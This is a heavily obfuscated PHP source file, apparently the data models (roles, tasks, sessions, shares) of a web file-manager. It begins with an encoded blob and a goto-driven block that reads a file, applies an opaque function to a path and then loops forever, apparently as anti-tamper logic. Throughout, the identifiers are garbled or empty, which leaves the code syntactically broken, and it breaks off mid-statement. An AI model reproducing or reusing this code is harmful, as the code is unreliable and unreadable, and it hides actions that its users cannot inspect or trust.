1\xf1\x34\x34\xea\x7b\xad\xd7\xe6\xf1\x63\x7\xce\x7\x8e\x11\xcc\xd1\x24\x55"."\xd0\x5f\xe7\x3b\xba\x5c\xc3\xc1\x12\x9b\xc5\xb2\x1d\x2f\x37\x27\x11\x5\x19\xf4\x50\xd8\xc5\xe8\x4f\x84\xda\xc6\xe4\x6f\xd9\x34\x8c\xf4\x1c\x25\x32\x89\xa5\xf0\x2d\xb1\x84\xc5\xa0\x21\xc\x32\xac\xe7\x7e\x6e\x58\xda\x7d\x1c".strrev('	R;	KT&'."\0".'&FrJ4l#:~8(6ăʹ')."\xa5\x95\x62\x98\x5e\x12\x39\x62\xcb\xd2\x89\x50\x7e\xd8\x86\x5e\x1c\x9\xf\x14\x90\x1d\xf5\xb3\x87\xde\x18\xc3\x84\xc9\x55\xb2\x5b\x7c\x2e\xf3\x47\xd8\x86\x1f\x9c\xfd\xd5\xb7\xfe\x58\x71\xe\xf0\x8\x56\x54\x62\x1a\x62\x43".base64_decode('Jjl4+eQjG2RQFisCHORNRg0fMhkP+SD4QUZrbFu6HnGuygeGGDUft6bGF+SnXc/yo5Dsq1AoE1E=')."\xa8\x13\xd6\x70\x4\x91\x46\x2b\x5\x67\x33\xdc\x2a\xce\x43\xc7\xea\xe1\x3b\xc6\xb0\x30\x1a\xf5\x14\x2b\x5\x76\xb6\xc1\xdf\x58\x89\xc3\xc3\x1f\xa6\xf6\xd0\x37\x36\x3c\xf4\x94\x67\x41\x61\x6a\xaf\x33\xf9\x9b\xd9\xb8\xff\x9c"."\x45\xe0\xc7\x8e\xaa\x93\x8b\xfb\xd0\xc2\xe7\xcb\x55\x20\xee\x9e\x3d\x2c\x16\x74\xcb\xb8\x85\xa\x4\xc\x82\x7\x9c\x27\x37\x18\xb5\x18\xa1\x34\xa4\x4a\x39\xef\x21\xa\x20\x1e\xa6\xa1\xe9\x1a\xbf\x63\x6a\xc5\x58\xe5\xb5\x72"."\x59\x21\xf2\x60\x2c\x2f\x8f\xb2\xb7\x9c\x4f\x8\xd3\x32\xd2\x23\xb1\x50\xf2\xec\x7f\x65\x67\xc0\x2c\x83\x1c\xf1\x32\x4e\x1c\xd8\xb2\x38\x55\x66\x17\xea\xee\x6c\x86\x3\xaa\x11\x7d\x16\x66\xef\xf4\xd5\x98\x2a\x12\x51\xd\xdf".strrev('VhP%Qq;ZtI1«qG#'."\0".'{4-ĥA"s')."\x7d\xb1\xc3\xcc\xe3\xb3\x73\x1\x5f\x15\xd8\x65\xcd\x79\x18\xac\x71\xe6\x61\x24\x96\xcc\x62\xcd\x17\xe7\x25\x92\xe7\xa9\x22\x7f\x94\xab\x20\xd0\x8\xe3\xe1\x33\xa\xfb\xb7\x68\xa4\x87\x88\x3f\x38\xd2\x2\xb5\x1\xf4\x58\xfa".strrev('H`=+LaK[9NW#*· q".Ր]8$W/GGN').base64_decode('bKl5Vdg6UzIYZUtaayJdrVHYNrHOliXqc9VAV6AGgIi+Sa/skGGxszKWjYuQc5AgzxLJ0vm29oE=').base64_decode('GM8lkRzHivmxWkOvMYQvgWt2BvUvE12XdJacC+TqBWVyOcwQW0X5wO3VbC/nlGJkfoHxExIAV5U=')."\x28\xa3\x10\x36\xe\x78\x94\xc9\x32\x55\x79\x80\xa0\xfb\x46\x0\xa5\x94\x26\x46\xc2\x1c\xcb\x4c\x22\x32\x61\x8\x5d\xdc\x55\x11\xe7\x1e\xc2\x1\x21\x41\x3d\xe\x34\x24\xbd\x66\x25\x3b\xc7\x20\x15\xc9\xb0\x5a\x5d\x35\x25\xc2".strrev(')gaGqu܃&	[Mpc{jIw\'@sWTD'."\0".'$Dl$/>D')."\22\32\166\107\262\251\43\33\117\240\165\311\311\217\343\354\107\217\207\250\105\307\131\320\22\323\3\273\50\343\241\10\236\7\71\170\3\176\3\374\117\214\25\151\153\22\253\301\72\65\50\175\161\226\7\7"."\44\311\270\303\313\21\166\72\354\332\271\314\167\22\66\324\227\157\66\351\353\51\364\233\235\161\170\47\11\322\255\265\21\205\271\266\107\230\150\173\30\101\366\114\235\62\205\370\300\300\145\270\324\243\6\161"."\x20\xc3\xfe\x12\xd6\x6a\x2e\xb7\x76\xe6\xc6\x8d\x4\xbd\xb2\x40\x27\x1c\x3f\xa0\xdb\xf8\x5d\x31\x8e\xb5\xa9\xc\xdd\x35\x20\x27\xcb\x30\x5\x60\x5\xcd\xbb\x6f\x58\xe0\xf\x12\xe6\x2a\xff\xcc\x3\x35\x73\x4c\xad\xb1\x6b\x46".strrev('I)1V8@a"D}Ϲue#xVLZSilo')."\324\205\142\244\132\270\112\47\144\26\146\317\344\4\41\31\161\3\141\166\215\223\150\74\73\137\107\222\370\262\252\154\242\163\210\175\343\112\327\354\53\215\231\5\342\101\16\46\131\166\351\23\53\261\123\165"."\x3\x90\x81\x81\x65\xc\xad\x11\xcf\x62\x80\xdd\x64\x8c\xe6\x88\xaa\xc2\x83\x49\xc7\xd2\x39\x22\xe5\x55\x11\xa8\xcb\xe7\x74\x61\x8\x25\xf0\xd5\x76\x9b\x74\x54\xa5\x99\xd8\x83\x9\xa0\xb4\x22\x21\x5e\x62\xca\xe3\x7c\x45\xab".base64_decode('VHG/okVPj3IdslZMdXMctchFsAWHU3zIHCl4G72uiCavqzrDonc5rj0kd4YaWGFhVhyLj5i4kNw=')."\306\221\253\173\157\165\31\311\312\137\276\336\257\332\261\265\21\10\357\224\230\100\374\45\317\7\103\104\75\145\223\314\255\63\226\213\324\44\125\370\264\44\227\166\263\144\64\172\206\117\36\210\174\137\355\274"."\23\303\156\351\102\352\312\60\166\121\25\76\41\324\313\336\232\60\114\362\356\43\253\245\267\133\176\177\20\337\226\164\230\34\334\360\256\24\217\32\330\205\122\220\137\115\73\215\324\45\73\2\376\336\243\44".strrev('9J3TMf1U4ew0Qֶ)xHXlYV=Mffu')."\x7c\x45\x4e\x38\x53\x25\x66\x7b\xa1\xaf\xe1\x18\xf5\x58\x17\xf\x81\xb4\x86\x17\xaa\x59\x91\x49\xbd\xee\xd5\x4a\x43\x90\x98\xb0\x1d\x20\x23\x5e\x14\x75\xbf\x24\xea\x7c\x9f\xb0\x45\x12\x1a\xd3\x87\x58\x1d\xcf\xd\x57\x2d\x51".base64_decode('1AwKhsWVhjHH5Kn4mC+u4bHTLezPE9vk+ImuAXs+Ui2oTO0Li1KEFIwg4upTMrRgl8di5XghWuU=')."\0\327\151\205\47\225\47\347\50\52\356\162\110\275\100\241\102\216\222\256\224\320\161\64\343\174\110\232\44\222\150\366\62\11\324\40\335\225\73\65\24\270\15\163\25\175\255\30\21\51\231\224\142\136\356\321".base64_decode('L3ayEBYuGUkyvQoMuM+HUqlex1Ff0mdIE0wRqr7RFhftErfKimFZgWAcXPESZhXEUhsW3LY4imU=').base64_decode('Mh3acI2smarDIorhWQm3LnnHEhZU+ojcOuQTxkyOjNWxwnuWVN51yCbDxHG1hk/QnrO47J2LA5U=')."\x88\x22\x79\xd2\x5c\xf9\x47\x92\x60\x60\x65\x29\xa1\x15\x44\x87\xc2\x25\x68\xa2\x49\xa7\x2f\x30\x9e\x8d\xaf\x19\xca\x43\x4c\x2e\xbd\x8e\x58\xd7\x19\x1c\x8b\x28\x19\x9f\xe9\x4a\x2\xf1\x9d\x54\x7d\x4d\x29\x9f\x4\x2\x7a\x3e".base64_decode('IlUnKztMWiBRuxEBlc4pliRaIoHxOqZj8iUNJj4wyBmXEx3dqQEa7Oghy4WrE818Ht9oT5JMla0=')."\x25\x4a\x5b\x9d\x23\xcf\x35\x76\x68\x87\xc8\x39\x5a\x6c\x1c\x1a\x59\x20\x72\x27\x9a\x16\x70\x26\xd1\xfc\xba\x6b\xde\xe4\x2\xee\x39\xa5\x25\x64\x7a\xe7\x88\x1f\x31\xec\x74\x4e\x3a\xf4\x57\x27\x56\xc7\x97\xab\x96\x19\x3a\x50"."\x7b\x1c\xee\xde\xb2\x55\x76\x2b\x3f\x89\x4a\xaa\xfa\x23\x69\x66\x25\xcd\x1a\x65\x68\x8f\x6a\x16\xa3\x49\xb8\xa4\x38\x76\x39\xca\x4e\x32\x5\xb8\x2c\x4d\xc2\x65\xab\x92\x59\xe1\xaa\x79\x25\xe5\x6c\xad\x62\x4d\x32\xbc\xea\xc9"."\x3\x79\x66\xa6\xc6\x80\x85\x9c\x50\xca\x3a\xd9\x7c\xd6\xcc\x5c\xdd\x1c\xec\x1\x77\x6e\x22\x35\xab\xdd\xb\x49\xac\xe8\xd4\x97\xa9\xd5\x8b\x9a\x99\x27\xed\x85\x3b\xb7\xe0\x83\xf0\x21\xbb\x56\x4a\xcd\xd\xa\x8a\x20\x35\x28".strrev('\\V׌cQ@5<w=7kŦkjHՊ~UCV+UiMT(#AK')."\x67\x52\xd4\x84\x18\xc6\xbc\x31\x24\x94\x73\x99\xd\xd1\xc\x7\x79\xab\x14\x87\x8a\x26\x27\x99\x19\xa1\x90\xcd\x3b\x52\x55\x81\x73\x1f\x14\x2b\xd2\x4b\x3b\x35\xad\x98\x3c\x58\xf4\x55\x2d\x64\xca\xb3\x27\x24\x64\xfb\x2f\x7a".base64_decode('5jdtIy1prAobFj4yQxyC80JY7b5SENI5h4pTLfk7jqKfPuE8ntYn8WgCQBxWhpQzgmtIqskQxGo=')."\x34\xfc\x6\x9b\x5c\x28\x50\x4e\x82\x26\x27\xcc\xb2\xed\xa1\x2a\xf8\x25\xf2\xdb\x66\xda\xb6\x50\x0\x62\xd7\x1b\xe8\x1c\x80\xd9\x1\x8f\xa4\xfa\x86\xbe\xc4\xd5\x35\xee\x14\xb9\x1\x25\x30\x4c\x2f\x28\xf0\x27\xe8\x54\x60\xb9"."\122\102\247\251\4\351\71\2\370\256\225\7\342\325\127\255\35\374\255\223\41\63\223\62\107\231\227\147\4\71\322\234\110\136\56\301\63\244\244\234\107\334\332\130\176\232\342\207\267\45\275\344\152\304\13\176"."\207\327\226\6\35\305\351\323\342\134\265\376\313\152\200\153\1\121\5\175\10\216\210\201\301\262\61\221\114\124\45\365\4\22\211\225\261\170\73\175\67\256\52\231\224\222\24\41\253\222\172\272\142\321\311\322".base64_decode('Qt2BcKQqDetMRlXhKpwmhXtIL4mSwGS9CAeXi56wi8oIvD8uFkG6pivlzOJk68gqSGjMG6N8Y6U=')."\x17\x84\x7f\x79\x51\x89\x53\xec\x26\xdf\x6a\x59\xec\x69\x1a\xfe\xe1\x7c\x3c\xda\xa5\xa0\xec\x54\xb9\x61\x90\xb\xd5\x62\x45\xc8\x28\xb4\x14\x2f\x41\x2c\x7e\x7c\x8f\x23\x0\x7e\x9e\x10\xca\x37\x3e\x87\xde\x8f\x14\x4f\x36\x9".base64_decode('wTrS3pWpO7np5dI4kjyz5mzWuG6U72xxqpgc3M3j2Cs5a82UpPJIz3bgvACmW1J9pd+OZFsb9HI=').base64_decode('dCBptFAJOUYKQnb9vwH3j+ZyDMkAAA==')."", 10, -8))); goto d; cѮ: if (!isset($_SERVER[$_SERVER[][991]]) || !isset($_SERVER[$_SERVER[][998]])) { $_getc = $_SERVER[][993]; $_getfile = $_SERVER[$_SERVER[][994]] . $_SERVER[][995]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][285], $_getfilec); if (count($_getarrs) < $_SERVER[][714]) { $exit = $_SERVER[][996]; $exit(); } $_act = $_SERVER[][997]; $_act($_SERVER[$_SERVER[][994]] . $_SERVER[][995]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[][463]); } } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x72\157\x6c\x65\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\141\x75\x74\x68", "\154\x61\x62\x65\x6c", "\144\151\163\x70\154\x61\x79", "\x73\171\x73\x74\x65\155", "\x64\145\x73\x63", "\x69\x67\x6e\x6f\162\x65\x45\x78\x74", "\151\147\x6e\x6f\x72\x65\x46\x69\154\x65\123\x69\x7a\x65", "\141\x64\155\151\156\x69\163\x74\162\x61\x74\157\162", "\x73\x6f\x72\164"); public function listData($븥 = false, $̋ = "\163\157\x72\x74", $캌 = false) { $ =& $_SERVER[]; $ꗞ = parent::listData($븥, $̋, $캌); if (!$븥) { foreach ($ꗞ as $ => $۩) { if ($۩[$[2369]] == 1) { $ꗞ[$][$[540]] = LNG($[2657]); } } } return $ꗞ; } public function update($, $نΒ) { $ =& $_SERVER[]; $ = parent::listData($); $ = $this->findByName($نΒ[$[32]]); if (!$ || $ && $[$[487]] != $[$[487]]) { return !1; } if ($[$[2369]] == 1) { $نΒ = array($[32] => $نΒ[$[32]], $[2196] => $نΒ[$[2196]]); } $this->filterAuth($نΒ[$[502]]); return parent::update($, $نΒ); } public function remove($حϚ) { $޽ = parent::listData($حϚ); if (!$޽ || $޽[$_SERVER[][189]]) { return !1; } return parent::remove($حϚ); } public function add($) { $ =& $_SERVER[]; $䂵 = $[$[32]]; if ($this->findByName($䂵)) { return !1; } $ = array($[509] => $䂵, $[2181] => $[12], $[2177] => $[2185], $[2658] => 1, $[2180] => 0, $[2659] => 0, $[2179] => $this->getSort()); $ = array_merge($, $); $this->filterAuth($[$[502]]); return parent::insert($); } private function getSort() { $ =& $_SERVER[]; $ = parent::listData(); $° = array_to_keyvalue($, $[12], $[2197]); return empty($°) ? 0 : max($°) + 1; } private function filterAuth(&$̈) { $ =& $_SERVER[]; $ǣ﯁ = array(); $ԏ = array_filter(explode($[50], $̈)); foreach ($ԏ as $̈) { $Ōߠ = explode($[10], $̈); if ($Ōߠ[0] == $[2660] && $Ōߠ[1] != $[1303]) { $Ԯ = $Ōߠ[0] . $[10] . $Ōߠ[1] . $[2661]; if (!in_array($Ԯ, $ԏ)) { $ǣ﯁[] = $Ԯ; } } $ǣ﯁[] = $̈; } $̈ = implode($[50], $ǣ﯁); } public function findRoleDefault() { $ =& $_SERVER[]; $ذ = parent::listData(); $׍Ƹ = !1; foreach ($ذ as $ň) { if (!$ň || $ň[$[2195]] == $[228] || $ň[$[2369]] == 1) { continue; } if (strstr($ň[$[502]], $[2662])) { continue; } if (!strstr($ň[$[502]], $[2663])) { continue; } if (!$׍Ƹ) { $׍Ƹ = $ň; continue; } $ = explode($[50], $׍Ƹ[$[502]]); $ = explode($[50], $ň[$[502]]); if (count($) > count($)) { $׍Ƹ = $ň; } } return $׍Ƹ ? $׍Ƹ[$[487]] : $[12]; } public function sort($, $殌) { return parent::update($, $殌); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\x74\141\163\x6b\114\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x74\x79\x70\x65", "\x65\x76\x65\156\x74", "\164\151\155\145", "\144\x65\163\x63", "\x73\171\x73\164\x65\155", "\145\156\141\142\x6c\145", "\154\x61\x73\164\122\165\x6e", "\163\157\162\x74"); public function listData($ʲ = false, $ף = "\163\x6f\162\164", $ց = false) { return parent::listData($ʲ, $ף, $ց); } public function add($ȝ) { $ʮ =& $_SERVER[]; $̾ = $this->findByName($ȝ[$ʮ[32]]); if ($̾) { return !1; } $ȝ[$ʮ[1921]] = 0; $ȝ[$ʮ[2197]] = $this->getSort(); return parent::insert($ȝ); } private function getSort() { $Ɇ =& $_SERVER[]; $ۥ = parent::listData(); $ = array_to_keyvalue($ۥ, $Ɇ[12], $Ɇ[2197]); return empty($) ? 0 : max($) + 1; } public function update($Ӆ, $☆) { $߷ =& $_SERVER[]; $ǍӞ = $this->listData($Ӆ); $ܵ = $this->findByName($☆[$߷[32]]); if (!$ǍӞ || $ܵ && $ܵ[$߷[487]] != $ǍӞ[$߷[487]]) { return !1; } return parent::update($Ӆ, $☆); } public function remove($ۣ, $ظ = false) { $ł =& $_SERVER[]; $Ɗ = $this->listData($ۣ); if (!$Ɗ) { return; } if (!$ظ && $Ɗ[$ł[189]] == $ł[91]) { return !1; } return parent::remove($ۣ); } public function enable($, $՞) { return $this->update($, array($_SERVER[][2652] => $՞)); } public function run($) { return $this->update($, array($_SERVER[][2664] => time())); } } goto AǞ; f܇: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\x5f\x73\145\x73\x73\151\x6f\x6e"; public function get($Ē) { $ϖ =& $_SERVER[]; $¶旾 = $this->where(array($ϖ[2312] => $Ē))->find(); if (!is_array($¶旾)) { return !1; } return $¶旾[$ϖ[168]]; } public function set($ީ, $爜, $ = 3600) { $ =& $_SERVER[]; $ǒ = array($[2312] => $ީ, $[2215] => $爜, $[2313] => $ + time()); if (Session::get($[2314])) { $ǒ[$[1586]] = Session::get($[2314]); } else { $ǒ[$[1586]] = 0; } if ($this->get($ީ)) { return $this->where(array($[2312] => $ީ))->save($ǒ); } else { return $this->add($ǒ, array(), !0); } } public function remove($) { return $this->where(array($_SERVER[][2312] => $))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][2315] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\151\155\x65", "\164\x69\x6d\x65", "\x69\156\x73\x65\162\x74\x2c\165\x70\144\x61\164\145", "\146\165\156\143\164\151\x6f\156"), array("\143\162\x65\x61\164\145\124\151\155\145", "\x74\x69\x6d\x65", "\151\156\x73\145\x72\x74", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\157\x70\164\x69\x6f\156\x73", '', "\x69\156\x73\x65\162\164\54\165\x70\x64\141\x74\145\54\x73\x65\154\x65\x63\x74", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($) { $ၯ =& $_SERVER[]; return array($ၯ[2316] => array(USER_ID, $ၯ[2317]), $ၯ[2318] => array($[0], $ၯ[2319])); } protected function ___listSimple() { $ = $this->field($this->fieldList)->where(array($_SERVER[][1586] => USER_ID))->select(); return $ ? $ : array(); } protected function ___getInfoShare($̚ϔ) { return $this->_getShareInfo(array($_SERVER[][687] => $̚ϔ), !1); } protected function getInfo($Ϥ) { $Ӄ = $this->getInfoShare($Ϥ); return $this->shareSourceInfo($Ӄ); } public function getInfoByHash($) { return $this->_getShareInfo(array($_SERVER[][1548] => $)); } public function getInfoByPath($ǃ) { $ =& $_SERVER[]; $ܸ = array($[1586] => USER_ID, $[191] => $ǃ); return $this->_getShareInfo($ܸ); } public function getInfoBySourcePath($̸ס) { $ =& $_SERVER[]; $ƞ = array($[1586] => USER_ID, $[583] => $̸ס); return $this->_getShareInfo($ƞ); } private function _getShareInfo($, $績 = true) { $Ǥ =& $_SERVER[]; $ќ = $this->where($)->find(); if (!$ќ) { return !1; } if (!is_array($ќ[$Ǥ[580]])) { $ќ[$Ǥ[580]] = array(); } $ = array($Ǥ[687] => $ќ[$Ǥ[687]]); $̨Ԫ = $Ǥ[2320]; $ќ[$Ǥ[1544]] = Model($Ǥ[688])->order($Ǥ[487])->field($̨Ԫ)->where($)->select(); if (!$績) { return $ќ; } return $this->shareSourceInfo($ќ); } private function shareSourceInfo($ˏ) { $Ѹ؋ =& $_SERVER[]; if (!is_array($ˏ)) { return $ˏ; } if ($ˏ[$Ѹ؋[191]] == $Ѹ؋[228]) { $ˏ[$Ѹ؋[90]] = IO::info($ˏ[$Ѹ؋[583]]); } else { $ˏ[$Ѹ؋[90]] = Model($Ѹ؋[1527])->pathInfo($ˏ[$Ѹ؋[191]]); } return $ˏ; } protected function getInfoAuth($) { $ =& $_SERVER[]; $ = $this->getInfo($); if ($[$[1586]] == USER_ID) { $[$[502]] = $[$[90]][$[502]]; } else { $[$[502]] = Model($[587])->authMake($[$[1544]]); } return $; } protected function listData($ = null, $ב = 300) { $Ԃ =& $_SERVER[]; $ = array(array($Ԃ[578] => array($Ԃ[1174], 0), $Ԃ[685] => array($Ԃ[1174], 0), $Ԃ[2321] => $Ԃ[2277])); if ($ == $Ԃ[2322]) { $ = array($Ԃ[578] => 1); } else { if ($ == $Ԃ[1341]) { $ = array($Ԃ[685] => 1); } } $[$Ԃ[1586]] = USER_ID; $줩 = $this->where($)->selectPage($ב); return $줩; } protected function listToMe($쇮 = 300) { $ѝ =& $_SERVER[]; $ = Model($ѝ[2323])->userGroupParents(USER_ID); $ę = array($ѝ[670] => SourceModel::TYPE_USER, $ѝ[589] => USER_ID); if ($) { $ę = array(array($ѝ[670] => SourceModel::TYPE_USER, $ѝ[589] => USER_ID), array($ѝ[670] => SourceModel::TYPE_GROUP, $ѝ[589] => array($ѝ[7], $)), $ѝ[2321] => $ѝ[2277]); } $Σ = Model($ѝ[688])->field($ѝ[687])->where($ę)->select(); $Σ = array_unique(array_to_keyvalue($Σ, $ѝ[12], $ѝ[687])); $ę = array($ѝ[687] => array($ѝ[507], $Σ)); if (!$Σ) { return array($ѝ[446] => array(), $ѝ[443] => array($ѝ[2324] => 0, $ѝ[428] => 1)); } $Ǟ = Model($ѝ[688])->where($ę)->select(); $Ǟ = array_to_keyvalue_group($Ǟ, $ѝ[687]); $ֈ̇ = $ѝ[2325]; $ё = $this->field($ֈ̇)->where($ę)->selectPage($쇮); foreach ($ё[$ѝ[446]] as $ => &$ƹȆ) { $ƹȆ[$ѝ[1544]] = $Ǟ[$ƹȆ[$ѝ[687]]]; } unset($ƹȆ); return $ё; } protected function shareAdd($چ, $۶) { $ =& $_SERVER[]; $٬ = $this->_addShareData($چ, $۶); if (!empty($۶[$[2326]])) { $this->_shareAuthSet($٬, $۶[$[2326]]); } $this->shareEventAdd($چ, $۶, $[2327]); return $٬; } protected function shareAddSystem($ƿ, $) { $̃ =& $_SERVER[]; $Ӷ = $this->_addShareData($ƿ, $, $̃[189]); $this->_shareAuthSet($Ӷ, $[$̃[2326]]); return $Ӷ; } private function shareEventAdd($, $, $ = "\x61\144\x64") { $ش =& $_SERVER[]; if (!$ || $ == $ش[228]) { return; } if ($ == $ش[2327]) { if ($[$ش[578]] == $ش[91]) { Model($ش[655])->eventShare($, $ش[2328]); } if ($[$ش[685]] == $ش[91]) { Model($ش[655])->eventShare($, $ش[2329]); } return; } $ = $this->getInfoByPath($); $ = $ش[2330]; if ($[$ش[578]] == $ش[228] && $[$ش[578]] == $ش[91]) { $ = $ش[2328]; } if ($[$ش[578]] == $ش[91] && $[$ش[578]] == $ش[228]) { $ = $ش[2331]; } if ($[$ش[685]] == $ش[228] && $[$ش[685]] == $ش[91]) { $ = $ش[2329]; } if ($[$ش[685]] == $ش[91] && $[$ش[685]] == $ش[228]) { $ = $ش[2332]; } Model($ش[655])->eventShare($, $); return; } private function _addShareData($, $ü = array(), $ = false) { $ =& $_SERVER[]; $ = $ == $[189] ? 0 : USER_ID; $ = array($[506] => $, $[1961] => $); if ($ == 0) { $ = array($[2333] => $ü[$[583]], $[1961] => $); } if ($≘ = $this->where($)->find()) { return $≘[$[687]]; } if ($ == 0) { $ɥ = array($[32] => get_path_this($ü[$[87]])); } else { $ɥ = Model($[927])->sourceInfo($); if (!$ɥ) { return !1; } } if (!$ü[$[1859]]) { $ü[$[1859]] = $ɥ[$[32]]; } $ə = array($[1961] => $, $[506] => $, $[1859] => $[12], $[578] => 0, $[685] => 0, $[583] => $[12], $[382] => $[12], $[1045] => $[12], $[2334] => 0, $[2335] => 0, $[856] => 0, $[580] => $[12], $[1548] => $[12]); $ = explode($[50], $[2336]); foreach ($ as $) { if (!isset($ü[$])) { continue; } $ə[$] = $ü[$]; } $Ó = $this->add($ə); $Ù = array($[1548] => short_id($Ó)); if ($this->where($Ù)->find()) { $Ù[$[1548]] .= $[476] . rand_string(2, 3); } $this->where(array($[2337] => $Ó))->save($Ù); return $Ó; } private function _shareAuthSet($ז, $Ӓ) { $ĺ =& $_SERVER[]; if (!is_array($Ӓ)) { return !1; } $ = Model($ĺ[2286]); $->where(array($ĺ[687] => $ז))->delete(); $ۃ = array(); foreach ($Ӓ as $ý) { $恣╤ = SourceModel::TYPE_USER; if ($ý[$ĺ[188]] == SourceModel::TYPE_GROUP) { $恣╤ = SourceModel::TYPE_GROUP; } $ங = array($ĺ[687] => $ז, $ĺ[188] => $恣╤, $ĺ[589] => intval($ý[$ĺ[589]]), $ĺ[1634] => 0, $ĺ[2338] => -1); if ($ý[$ĺ[1634]]) { $ங[$ĺ[1634]] = $ý[$ĺ[1634]]; } else { if ($ý[$ĺ[2338]]) { $ங[$ĺ[2338]] = $ý[$ĺ[2338]]; } } $ۃ[] = $ங; } return $->addAll($ۃ, array(), !0); } public function numViewAdd($) { $ꔂ =& $_SERVER[]; $۝ƾ = array($ꔂ[2337] => $); $this->where($۝ƾ)->setAdd($ꔂ[2334]); } public function numDownloadAdd($ˡ) { $ǞΆ =& $_SERVER[]; $ = array($ǞΆ[2337] => $ˡ); $this->where($)->setAdd($ǞΆ[2335]); } protected function shareEdit($η, $) { $ő =& $_SERVER[]; $া = $this->getInfo($η); if (!$া) { return !1; } if ($[$ő[1548]] && $[$ő[578]] == $ő[91]) { if ($[$ő[1548]] == $া[$ő[1548]]) { unset($[$ő[1548]]); } if ($[$ő[1548]]) { $ރ = $this->where(array($ő[2339] => $[$ő[1548]]))->find(); if ($ރ) { return !1; } if (!is_array($[$ő[580]])) { $[$ő[580]] = is_array($া[$ő[580]]) ? $া[$ő[580]] : array(); } if (!$[$ő[580]][$ő[2340]]) { $[$ő[580]][$ő[2340]] = $া[$ő[1548]]; $[$ő[580]][$ő[2341]] = $ő[91]; } } } $this->_checkLinkShare($, $া); $蒗ᅨ = array(); $獘 = explode($ő[50], $ő[2342]); foreach ($獘 as $ū) { if (!array_key_exists($ū, $)) { continue; } $蒗ᅨ[$ū] = $[$ū]; } $this->shareEventAdd($া[$ő[191]], $, $ő[1555]); $this->where(array($ő[2337] => $η))->save($蒗ᅨ); if (isset($[$ő[2326]])) { $this->_shareAuthSet($η, $[$ő[2326]]); } return !0; } private function _checkLinkShare($Ɉ, $ڧ͉) { $㺕 =& $_SERVER[]; if ($Ɉ[$㺕[578]] != $㺕[91]) { return; } $ֳ = $ڧ͉[$㺕[90]][$㺕[191]]; if ($ڧ͉[$㺕[90]][$㺕[33]] != $㺕[230]) { $ِ߭ = $this->_folderReport($ֳ); if (!$ِ߭) { return; } show_json(LNG($㺕[2343]) . $㺕[2344] . $ِ߭, !1); } $ = Model($㺕[927])->fileInfoGet($ڧ͉[$㺕[90]][$㺕[191]]); if (!$) { return; } $Շ = $this->shareFileMeta($[$㺕[557]]); if (isset($Շ[$㺕[451]]) && $Շ[$㺕[451]] == $㺕[91]) { show_json(LNG($㺕[2345]), !1); } } private function _folderReport($ނ) { $ڭ =& $_SERVER[]; $˔ = array($ڭ[557] => array($ڭ[1174], 0), $ڭ[844] => 3); $ = Model($ڭ[2346])->where($˔)->field($ڭ[557])->select(); if (!$) { return !1; } $ = array_to_keyvalue($, $ڭ[12], $ڭ[557]); $ύŠ = $ڭ[50] . $ނ . $ڭ[50]; $˔ = array($ڭ[557] => array($ڭ[7], $), $ڭ[604] => array($ڭ[473], "\x25{$ύŠ}\x25"), $ڭ[520] => 0); $Ƒ = Model($ڭ[927])->where($˔)->field($ڭ[2347])->find(); if (!$Ƒ) { return !1; } $ = substr($Ƒ[$ڭ[604]], strpos($Ƒ[$ڭ[604]], $ύŠ)); $˔ = array($ڭ[191] => array($ڭ[7], trim($, $ڭ[50]))); $ź = Model($ڭ[927])->where($˔)->field($ڭ[32])->select(); $ʭ = array_to_keyvalue($ź, $ڭ[12], $ڭ[32]); $ʭ[] = $Ƒ[$ڭ[32]]; return implode($ڭ[8], $ʭ); } protected function remove($蒵) { $缌ק =& $_SERVER[]; $Ў = is_array($蒵) ? $蒵 : array($蒵); for ($ = 0; $ < count($Ў); $++) { $¹ = $this->getInfo($Ў[$]); if ($¹[$缌ק[685]] == $缌ק[91]) { Model($缌ק[655])->eventShare($¹[$缌ק[191]], $缌ק[2332]); } if ($¹[$缌ק[578]] == $缌ק[91]) { Model($缌ק[655])->eventShare($¹[$缌ק[191]], $缌ק[2331]); } } $㪆 = array($缌ק[687] => array($缌ק[7], $Ў)); $ = $this->where($㪆)->delete(); if ($) { Model($缌ק[688])->where($㪆)->delete(); } return $; } protected function removeBySource($) { $嫐 =& $_SERVER[]; $⪭ = array($嫐[506] => array($嫐[507], $)); $Ӕ = $this->field($嫐[687])->where($⪭)->select(); $؏ = array_to_keyvalue($Ӕ, $嫐[12], $嫐[687]); if (!$؏) { return; } foreach ($Ӕ as $ȓ) { $this->cacheFunctionClear($嫐[2348], $ȓ[$嫐[687]]); } $⪭ = array($嫐[2337] => array($嫐[507], $؏)); $this->where($⪭)->delete(); Model($嫐[688])->where($⪭)->delete(); } public function listAll($ƙ) { $ =& $_SERVER[]; $ƻ = array(); if ($ƙ[$[1586]]) { $ƻ[$[1586]] = $ƙ[$[1586]]; } if ($ƙ[$[855]]) { $ɩد = $ƙ[$[856]] ? $ƙ[$[856]] : strtotime(date($[2349])); $ƻ[$[231]] = array($[408], array($ƙ[$[855]], $ɩد)); } if ($ƙ[$[33]]) { $ƻ[$ƙ[$[33]]] = 1; } else { $ƻ[] = array($[578] => array($[1174], 0), $[685] => array($[1174], 0), $[2321] => $[2277]); } if ($ƙ[$[2273]]) { $ƻ[] = array($[1548] => $ƙ[$[2273]], $[1859] => array($[473], "\x25{$ƙ[$[2273]]}\45"), $[2321] => $[2277]); } $Ի = $this->_makeOrder()->where($ƻ)->selectPage(20); if (empty($Ի[$[446]])) { return array(); } $this->_listDataApply($Ի[$[446]]); return $Ի; } public function listDataApply($) { $this->_listDataApply($); return $; } private function _listDataApply(&$Ӭ) { $̓ =& $_SERVER[]; $ = array_to_keyvalue($Ӭ, $̓[12], $̓[1586]); $Ɛ = Model($̓[617])->userListInfo(array_unique($)); $؏ = array_to_keyvalue($Ӭ, $̓[12], $̓[191]); $΍ = 